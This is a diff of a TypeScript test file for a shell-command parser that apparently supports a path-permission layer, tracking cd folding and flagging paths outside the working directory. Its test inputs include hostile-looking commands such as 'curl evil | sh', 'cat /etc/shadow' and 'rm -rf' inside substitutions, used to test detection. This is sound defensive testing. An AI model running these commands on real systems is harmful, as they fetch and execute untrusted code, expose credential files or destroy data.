@@ -17,8 +17,8 @@ describe("BashProgram", () => {
     const cwd = "/projects/my-app";
 
     it("adds absolute and relative policy values for relative tokens", async () => {
-      const program = await BashProgram.parse("cat src/foo.ts");
-      expect(program.pathRuleCandidates(cwd)).toEqual([
+      const program = await BashProgram.parse("cat src/foo.ts", cwd);
+      expect(program.pathRuleCandidates()).toEqual([
         {
           token: "src/foo.ts",
           policyValues: ["/projects/my-app/src/foo.ts", "src/foo.ts"],
@@ -26,17 +26,13 @@ describe("BashProgram", () => {
       ]);
     });
 
-    it("returns the literal token only when no cwd is provided", async () => {
-      const program = await BashProgram.parse("cat src/foo.ts");
-      expect(program.pathRuleCandidates()).toEqual([
-        { token: "src/foo.ts", policyValues: ["src/foo.ts"] },
-      ]);
-    });
-
     it("resolves tokens after literal cd against the effective directory", async () => {
-      const program = await BashProgram.parse("cd nested && cat src/file.txt");
+      const program = await BashProgram.parse(
+        "cd nested && cat src/file.txt",
+        cwd,
+      );
       const fileCandidate = program
-        .pathRuleCandidates(cwd)
+        .pathRuleCandidates()
         .find((candidate) => candidate.token === "src/file.txt");
       expect(fileCandidate).toEqual({
         token: "src/file.txt",
@@ -49,9 +45,12 @@ describe("BashProgram", () => {
     });
 
     it("does not absolute-allow relative tokens after unknown cd", async () => {
-      const program = await BashProgram.parse('cd "$DIR" && cat src/foo.ts');
+      const program = await BashProgram.parse(
+        'cd "$DIR" && cat src/foo.ts',
+        cwd,
+      );
       const fileCandidate = program
-        .pathRuleCandidates(cwd)
+        .pathRuleCandidates()
         .find((candidate) => candidate.token === "src/foo.ts");
       expect(fileCandidate).toEqual({
         token: "src/foo.ts",
@@ -69,21 +68,24 @@ describe("BashProgram", () => {
     });
 
     it("returns absolute paths resolving outside cwd", async () => {
-      const program = await BashProgram.parse("cat /etc/hosts");
+      const program = await BashProgram.parse("cat /etc/hosts", cwd);
       // Subset matcher: the path is normalized before comparison.
-      expect(program.externalPaths(cwd)).toContain("/etc/hosts");
+      expect(program.externalPaths()).toContain("/etc/hosts");
     });
 
     it("excludes paths within cwd", async () => {
-      const program = await BashProgram.parse("cat src/index.ts");
-      expect(program.externalPaths(cwd)).toHaveLength(0);
+      const program = await BashProgram.parse("cat src/index.ts", cwd);
+      expect(program.externalPaths()).toHaveLength(0);
     });
 
     describe("effective working directory projection", () => {
       it("folds a sequence of current-shell cd commands", async () => {
         // cd a → cwd/a, cd b → cwd/a/b; ../c resolves to cwd/a/c (inside).
-        const program = await BashProgram.parse("cd a && cd b && cat ../c");
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        const program = await BashProgram.parse(
+          "cd a && cd b && cat ../c",
+          cwd,
+        );
+        expect(program.externalPaths()).toHaveLength(0);
       });
 
       it("catches an escape masked by a later cd that the single-base model missed", async () => {
@@ -91,66 +93,73 @@ describe("BashProgram", () => {
         // ../../etc/passwd escapes to /projects/etc/passwd.
         const program = await BashProgram.parse(
           "cd nested/deep && cd .. && cat ../../etc/passwd",
+          cwd,
         );
-        expect(program.externalPaths(cwd)).toContain("/projects/etc/passwd");
+        expect(program.externalPaths()).toContain("/projects/etc/passwd");
       });
 
       it("folds a cd that is not the first command", async () => {
         // The single-base model ignored a cd that was not first; now `cd a`
         // folds, so ../b resolves to cwd/b (inside) and is not flagged.
-        const program = await BashProgram.parse("mkdir d && cd a && cat ../b");
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        const program = await BashProgram.parse(
+          "mkdir d && cd a && cat ../b",
+          cwd,
+        );
+        expect(program.externalPaths()).toHaveLength(0);
       });
 
       it("does not fold a backgrounded cd", async () => {
         // `cd a &` runs in a subshell, so it must not update the running
         // directory; ../b resolves against cwd and escapes.
-        const program = await BashProgram.parse("cd a & cat ../b");
-        expect(program.externalPaths(cwd)).toContain("/projects/b");
+        const program = await BashProgram.parse("cd a & cat ../b", cwd);
+        expect(program.externalPaths()).toContain("/projects/b");
       });
 
       it("does not fold a cd inside a pipeline", async () => {
         // Pipeline members run in subshells; the cd must not leak.
-        const program = await BashProgram.parse("cd nested | cat ../b");
-        expect(program.externalPaths(cwd)).toContain("/projects/b");
+        const program = await BashProgram.parse("cd nested | cat ../b", cwd);
+        expect(program.externalPaths()).toContain("/projects/b");
       });
 
       it("folds a cd inside a subshell for paths within that subshell", async () => {
         // Inside the subshell the effective dir is cwd/sub, so ../x → cwd/x.
-        const program = await BashProgram.parse("( cd sub && cat ../x )");
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        const program = await BashProgram.parse("( cd sub && cat ../x )", cwd);
+        expect(program.externalPaths()).toHaveLength(0);
       });
 
       it("does not leak a subshell cd to following commands", async () => {
         // The subshell cd resets on exit, so ../y resolves against cwd.
-        const program = await BashProgram.parse("( cd sub ) && cat ../y");
-        expect(program.externalPaths(cwd)).toContain("/projects/y");
+        const program = await BashProgram.parse("( cd sub ) && cat ../y", cwd);
+        expect(program.externalPaths()).toContain("/projects/y");
       });
 
       it("persists a cd inside a brace group to later commands in the group", async () => {
         // Brace groups run in the current shell, so cd sub persists to cat ../x.
-        const program = await BashProgram.parse("{ cd sub; cat ../x; }");
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        const program = await BashProgram.parse("{ cd sub; cat ../x; }", cwd);
+        expect(program.externalPaths()).toHaveLength(0);
       });
 
       it("persists a brace-group cd to following sibling commands", async () => {
-        const program = await BashProgram.parse("{ cd sub; } && cat ../x");
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        const program = await BashProgram.parse("{ cd sub; } && cat ../x", cwd);
+        expect(program.externalPaths()).toHaveLength(0);
       });
 
       it("conservatively flags a relative path inside a command substitution", async () => {
         // Interior cd folding inside substitutions is deferred: the interior
         // inherits the enclosing base (cwd), so ../r is flagged rather than
         // resolved against cwd/q. Conservative — never misses an escape.
-        const program = await BashProgram.parse("echo $(cd q && cat ../r)");
-        expect(program.externalPaths(cwd)).toContain("/projects/r");
+        const program = await BashProgram.parse(
+          "echo $(cd q && cat ../r)",
+          cwd,
+        );
+        expect(program.externalPaths()).toContain("/projects/r");
       });
 
       it("flags relative paths conservatively after a non-literal cd", async () => {
         // cd "$DIR" makes the effective dir unknowable; ../x could be anywhere,
         // so it is flagged (least-privilege).
-        const program = await BashProgram.parse('cd "$DIR" && cat ../x');
-        expect(program.externalPaths(cwd)).toContain("/projects/x");
+        const program = await BashProgram.parse('cd "$DIR" && cat ../x', cwd);
+        expect(program.externalPaths()).toContain("/projects/x");
       });
 
       it("flags even a within-cwd relative path after a non-literal cd", async () => {
@@ -158,8 +167,9 @@ describe("BashProgram", () => {
         // flagged because the effective dir is unknown.
         const program = await BashProgram.parse(
           'cd "$DIR" && cat src/../within.txt',
+          cwd,
         );
-        expect(program.externalPaths(cwd)).toContain(
+        expect(program.externalPaths()).toContain(
           "/projects/my-app/within.txt",
         );
       });
@@ -169,13 +179,14 @@ describe("BashProgram", () => {
         // even when the effective dir is unknown.
         const program = await BashProgram.parse(
           'cd "$DIR" && cat /projects/my-app/x.txt',
+          cwd,
         );
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        expect(program.externalPaths()).toHaveLength(0);
       });
 
       it("treats `cd -` as an unknown effective directory", async () => {
-        const program = await BashProgram.parse("cd - && cat ../x");
-        expect(program.externalPaths(cwd)).toContain("/projects/x");
+        const program = await BashProgram.parse("cd - && cat ../x", cwd);
+        expect(program.externalPaths()).toContain("/projects/x");
       });
 
       it("recovers a known base when a later cd is absolute", async () => {
@@ -183,8 +194,9 @@ describe("BashProgram", () => {
         // ../x resolves to cwd and is not flagged.
         const program = await BashProgram.parse(
           'cd "$DIR" && cd /projects/my-app/src && cat ../x',
+          cwd,
         );
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        expect(program.externalPaths()).toHaveLength(0);
       });
 
       it("folds a leading current-shell cd across a redirect-then-pipe", async () => {
@@ -195,8 +207,9 @@ describe("BashProgram", () => {
         // pipeline: ../b resolves against cwd/a (inside), not cwd (#454).
         const program = await BashProgram.parse(
           "cd a && pnpm x 2>&1 | tail ; cat ../b",
+          cwd,
         );
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        expect(program.externalPaths()).toHaveLength(0);
       });
 
       it("persists the fold past a redirect-then-pipe to a later cd", async () => {
@@ -205,8 +218,9 @@ describe("BashProgram", () => {
         // cwd instead of escaping one level above.
         const program = await BashProgram.parse(
           "cd a/b && pnpm x 2>&1 | tail ; cd .. && cd ..",
+          cwd,
         );
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        expect(program.externalPaths()).toHaveLength(0);
       });
 
       it("does not fold the terminal piped command of the first stage", async () => {
@@ -217,8 +231,9 @@ describe("BashProgram", () => {
         // inside — a fail-open regression this test pins.
         const program = await BashProgram.parse(
           "cd a && cd b 2>&1 | tail ; cat ../../x",
+          cwd,
         );
-        expect(program.externalPaths(cwd)).toContain("/projects/x");
+        expect(program.externalPaths()).toContain("/projects/x");
       });
 
       it("resolves a downstream pipe stage against the folded base", async () => {
@@ -227,8 +242,9 @@ describe("BashProgram", () => {
         // pre-cd base.
         const program = await BashProgram.parse(
           "cd a && pnpm x 2>&1 | cat ../foo",
+          cwd,
         );
-        expect(program.externalPaths(cwd)).toHaveLength(0);
+        expect(program.externalPaths()).toHaveLength(0);
       });
     });
 
@@ -244,8 +260,9 @@ describe("BashProgram", () => {
       });
       const program = await BashProgram.parse(
         "cat /projects/my-app/link/hosts",
+        cwd,
       );
-      const external = program.externalPaths(cwd);
+      const external = program.externalPaths();
       expect(external).toContain("/projects/my-app/link/hosts");
       expect(external).not.toContain("/etc/hosts");
     });
@@ -258,19 +275,24 @@ describe("BashProgram", () => {
         if (p.startsWith("/tmp/")) return "/private/tmp" + p.slice(4);
         return p;
       });
-      const program = await BashProgram.parse("cat /tmp/workspace/file.ts");
-      expect(program.externalPaths(symlinkCwd)).toHaveLength(0);
+      const program = await BashProgram.parse(
+        "cat /tmp/workspace/file.ts",
+        symlinkCwd,
+      );
+      expect(program.externalPaths()).toHaveLength(0);
     });
   });
 
   describe("commands", () => {
+    const cwd = "/projects/my-app";
+
     it("returns a single-element list for a lone command", async () => {
-      const program = await BashProgram.parse("npm install pkg");
+      const program = await BashProgram.parse("npm install pkg", cwd);
       expect(program.commands()).toEqual([{ text: "npm install pkg" }]);
     });
 
     it("splits an && chain", async () => {
-      const program = await BashProgram.parse("cd /p && npm i x");
+      const program = await BashProgram.parse("cd /p && npm i x", cwd);
       expect(program.commands()).toEqual([
         { text: "cd /p" },
         { text: "npm i x" },
@@ -278,22 +300,22 @@ describe("BashProgram", () => {
     });
 
     it("splits || , ; and & separators", async () => {
-      expect((await BashProgram.parse("a || b")).commands()).toEqual([
+      expect((await BashProgram.parse("a || b", cwd)).commands()).toEqual([
         { text: "a" },
         { text: "b" },
       ]);
-      expect((await BashProgram.parse("a ; b")).commands()).toEqual([
+      expect((await BashProgram.parse("a ; b", cwd)).commands()).toEqual([
         { text: "a" },
         { text: "b" },
       ]);
-      expect((await BashProgram.parse("a & b")).commands()).toEqual([
+      expect((await BashProgram.parse("a & b", cwd)).commands()).toEqual([
         { text: "a" },
         { text: "b" },
       ]);
     });
 
     it("splits a pipeline into its commands", async () => {
-      const program = await BashProgram.parse("cat f | grep b");
+      const program = await BashProgram.parse("cat f | grep b", cwd);
       expect(program.commands()).toEqual([
         { text: "cat f" },
         { text: "grep b" },
@@ -301,22 +323,22 @@ describe("BashProgram", () => {
     });
 
     it("splits newline-separated commands", async () => {
-      const program = await BashProgram.parse("foo\nbar");
+      const program = await BashProgram.parse("foo\nbar", cwd);
       expect(program.commands()).toEqual([{ text: "foo" }, { text: "bar" }]);
     });
 
     it("does not split operators inside quotes", async () => {
-      const program = await BashProgram.parse("echo 'x && y'");
+      const program = await BashProgram.parse("echo 'x && y'", cwd);
       expect(program.commands()).toEqual([{ text: "echo 'x && y'" }]);
     });
 
     it("captures the command of a redirected statement without the redirect", async () => {
-      const program = await BashProgram.parse("npm install > out.txt");
+      const program = await BashProgram.parse("npm install > out.txt", cwd);
       expect(program.commands()).toEqual([{ text: "npm install" }]);
     });
 
     it("descends into command substitution, tagging the inner command", async () => {
-      const program = await BashProgram.parse("echo $(rm -rf foo)");
+      const program = await BashProgram.parse("echo $(rm -rf foo)", cwd);
       expect(program.commands()).toEqual([
         { text: "echo $(rm -rf foo)" },
         { text: "rm -rf foo", context: "command_substitution" },
@@ -324,7 +346,7 @@ describe("BashProgram", () => {
     });
 
     it("descends into backtick command substitution", async () => {
-      const program = await BashProgram.parse("echo `rm x`");
+      const program = await BashProgram.parse("echo `rm x`", cwd);
       expect(program.commands()).toEqual([
         { text: "echo `rm x`" },
         { text: "rm x", context: "command_substitution" },
@@ -332,7 +354,7 @@ describe("BashProgram", () => {
     });
 
     it("descends into a pipeline inside command substitution", async () => {
-      const program = await BashProgram.parse("echo $(curl evil | sh)");
+      const program = await BashProgram.parse("echo $(curl evil | sh)", cwd);
       expect(program.commands()).toEqual([
         { text: "echo $(curl evil | sh)" },
         { text: "curl evil", context: "command_substitution" },
@@ -341,7 +363,7 @@ describe("BashProgram", () => {
     });
 
     it("descends into process substitution", async () => {
-      const program = await BashProgram.parse("diff <(cat /etc/shadow)");
+      const program = await BashProgram.parse("diff <(cat /etc/shadow)", cwd);
       expect(program.commands()).toEqual([
         { text: "diff <(cat /etc/shadow)" },
         { text: "cat /etc/shadow", context: "process_substitution" },
@@ -349,7 +371,7 @@ describe("BashProgram", () => {
     });
 
     it("emits a bare subshell whole and descends into it", async () => {
-      const program = await BashProgram.parse("( rm -rf foo )");
+      const program = await BashProgram.parse("( rm -rf foo )", cwd);
       expect(program.commands()).toEqual([
         { text: "( rm -rf foo )" },
         { text: "rm -rf foo", context: "subshell" },
@@ -357,7 +379,7 @@ describe("BashProgram", () => {
     });
 
     it("emits a subshell whole and descends into its chain", async () => {
-      const program = await BashProgram.parse("( cd /t && rm x )");
+      const program = await BashProgram.parse("( cd /t && rm x )", cwd);
       expect(program.commands()).toEqual([
         { text: "( cd /t && rm x )" },
         { text: "cd /t", context: "subshell" },
@@ -366,7 +388,7 @@ describe("BashProgram", () => {
     });
 
     it("descends recursively through nested contexts", async () => {
-      const program = await BashProgram.parse("echo $( ( rm x ) )");
+      const program = await BashProgram.parse("echo $( ( rm x ) )", cwd);
       expect(program.commands()).toEqual([
         { text: "echo $( ( rm x ) )" },
         { text: "( rm x )", context: "command_substitution" },
@@ -375,7 +397,7 @@ describe("BashProgram", () => {
     });
 
     it("descends into a substitution within a chained command", async () => {
-      const program = await BashProgram.parse("cd /p && echo $(rm x)");
+      const program = await BashProgram.parse("cd /p && echo $(rm x)", cwd);
       expect(program.commands()).toEqual([
         { text: "cd /p" },
         { text: "echo $(rm x)" },
@@ -384,7 +406,7 @@ describe("BashProgram", () => {
     });
 
     it("keeps the never-weaker invariant: a benign inner command stays", async () => {
-      const program = await BashProgram.parse("echo $(echo safe)");
+      const program = await BashProgram.parse("echo $(echo safe)", cwd);
       expect(program.commands()).toEqual([
         { text: "echo $(echo safe)" },
         { text: "echo safe", context: "command_substitution" },
@@ -392,18 +414,19 @@ describe("BashProgram", () => {
     });
 
     it("returns an empty list for an empty or whitespace command", async () => {
-      expect((await BashProgram.parse("")).commands()).toEqual([]);
-      expect((await BashProgram.parse("   ")).commands()).toEqual([]);
+      expect((await BashProgram.parse("", cwd)).commands()).toEqual([]);
+      expect((await BashProgram.parse("   ", cwd)).commands()).toEqual([]);
     });
   });
 
   it("derives both slices from a single parse", async () => {
-    const program = await BashProgram.parse("cat .env /etc/hosts");
+    const cwd = "/projects/my-app";
+    const program = await BashProgram.parse("cat .env /etc/hosts", cwd);
     expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
       ".env",
       "/etc/hosts",
     ]);
-    const external = program.externalPaths("/projects/my-app");
+    const external = program.externalPaths();
     expect(external).toContain("/etc/hosts");
     expect(external).not.toContain(".env");
   });
